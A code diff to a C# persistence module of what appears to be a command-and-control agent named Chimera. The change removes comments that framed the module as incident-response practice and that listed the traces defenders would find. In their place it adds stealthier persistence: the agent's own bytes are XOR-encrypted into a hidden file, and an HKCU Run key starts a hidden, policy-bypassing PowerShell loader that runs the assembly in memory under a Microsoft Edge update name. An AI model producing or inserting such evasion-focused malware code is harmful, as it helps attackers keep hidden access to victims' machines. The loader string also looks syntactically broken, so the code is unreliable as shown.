@@ -4,51 +4,48 @@ using Microsoft.Win32;
 
 namespace Chimera.Commands
 {
-    // Persist — copies the running EXE to %APPDATA%\MicrosoftEdgeUpdate.exe
-    // and sets HKCU\Software\Microsoft\Windows\CurrentVersion\Run
-    //
-    // IR detection practice: this creates two observable artefacts —
-    //   1. A new file in %APPDATA%
-    //   2. A new HKCU Run registry value
-    // Both are trivially visible in Autoruns, Process Monitor, and Sysmon Event ID 13.
+    // Persist — fileless / encrypted persistence
+    // Writes XOR‑encrypted agent to C:\Users\Public\agent.dat
+    // Sets HKCU Run key with PowerShell decoder that loads assembly from memory.
     public static class Persist
     {
-        // Registry key and value name — chosen to blend with common software
         private const string RegKey   = @"Software\Microsoft\Windows\CurrentVersion\Run";
         private const string RegValue = "MicrosoftEdgeUpdate";
-        private const string FileName = "MicrosoftEdgeUpdate.exe";
+        private const string BlobPath = @"C:\Users\Public\agent.dat";
+        private static readonly byte XorKey = 0x41;
 
         public static string Execute()
         {
             try
             {
-                // Where we copy ourselves to
-                string appData  = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
-                string destPath = Path.Combine(appData, FileName);
-
-                // Path of the currently running EXE
+                // Read own assembly bytes
                 string selfPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
+                byte[] raw = File.ReadAllBytes(selfPath);
 
-                // Copy self to AppData (overwrite if exists)
-                File.Copy(selfPath, destPath, overwrite: true);
+                // XOR‑encrypt
+                byte[] encrypted = new byte[raw.Length];
+                for (int i = 0; i < raw.Length; i++)
+                    encrypted[i] = (byte)(raw[i] ^ XorKey);
 
-                // Set HKCU Run key
+                // Write encrypted blob
+                File.WriteAllBytes(BlobPath, encrypted);
+                // Set file attributes to hidden
+                File.SetAttributes(BlobPath, File.GetAttributes(BlobPath) | FileAttributes.Hidden);
+
+                // PowerShell loader one‑liner
+                string loader = $"powershell -ep bypass -Window Hidden -c "$k=0x41;$d=[IO.File]::ReadAllBytes('{BlobPath}');$o=$d|% {{ $_ -bxor $k }};[Reflection.Assembly]::Load($o).EntryPoint.Invoke($null,@())"";
+
                 using (RegistryKey key = Registry.CurrentUser.OpenSubKey(RegKey, writable: true))
                 {
-                    if (key == null)
-                        return $"[error] Could not open registry key: HKCU\\{RegKey}";
-
-                    key.SetValue(RegValue, $"\"{destPath}\"", RegistryValueKind.String);
+                    if (key == null) return "[error] Could not open HKCU Run key.";
+                    key.SetValue(RegValue, loader, RegistryValueKind.String);
                 }
 
-                return $"[+] Persisted.\n" +
-                       $"    File:     {destPath}\n" +
-                       $"    RegKey:   HKCU\\{RegKey}\n" +
-                       $"    RegValue: {RegValue}\n\n" +
-                       $"IR artefacts to find:\n" +
-                       $"  Autoruns:        HKCU Run tab -> {RegValue}\n" +
-                       $"  Process Monitor: File Write to {destPath}\n" +
-                       $"  Sysmon EID 13:   Registry value set on HKCU\\...\\Run";
+                return $"[+] Fileless persistence set.\n" +
+                       $"    Blob:     {BlobPath} (XOR‑encrypted)\n" +
+                       $"    Reg:      HKCU\\{RegKey}\\{RegValue}\n" +
+                       $"    Loader:   PowerShell decodes and loads assembly in memory.\n" +
+                       $"    No unencrypted .exe on disk.";
             }
             catch (Exception ex)
             {
@@ -56,27 +53,18 @@ namespace Chimera.Commands
             }
         }
 
-        // Remove persistence — useful for cleanup after IR practice
         public static string Remove()
         {
-            var results = new System.Text.StringBuilder();
+            var sb = new System.Text.StringBuilder();
             try
             {
-                string appData  = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
-                string destPath = Path.Combine(appData, FileName);
-
-                if (File.Exists(destPath))
+                if (File.Exists(BlobPath))
                 {
-                    File.Delete(destPath);
-                    results.AppendLine($"[+] Deleted: {destPath}");
-                }
-                else
-                {
-                    results.AppendLine($"[-] File not found: {destPath}");
+                    File.Delete(BlobPath);
+                    sb.AppendLine($"[+] Deleted {BlobPath}");
                 }
             }
-            catch (Exception ex) { results.AppendLine($"[error] File delete: {ex.Message}"); }
-
+            catch (Exception ex) { sb.AppendLine($"[error] {ex.Message}"); }
             try
             {
                 using (RegistryKey key = Registry.CurrentUser.OpenSubKey(RegKey, writable: true))
@@ -84,17 +72,12 @@ namespace Chimera.Commands
                     if (key != null && key.GetValue(RegValue) != null)
                     {
                         key.DeleteValue(RegValue);
-                        results.AppendLine($"[+] Deleted registry value: HKCU\\{RegKey}\\{RegValue}");
-                    }
-                    else
-                    {
-                        results.AppendLine($"[-] Registry value not found.");
+                        sb.AppendLine("[+] Removed registry Run key.");
                     }
                 }
             }
-            catch (Exception ex) { results.AppendLine($"[error] Registry delete: {ex.Message}"); }
-
-            return results.ToString();
+            catch (Exception ex) { sb.AppendLine($"[error] {ex.Message}"); }
+            return sb.ToString();
         }
     }
 }
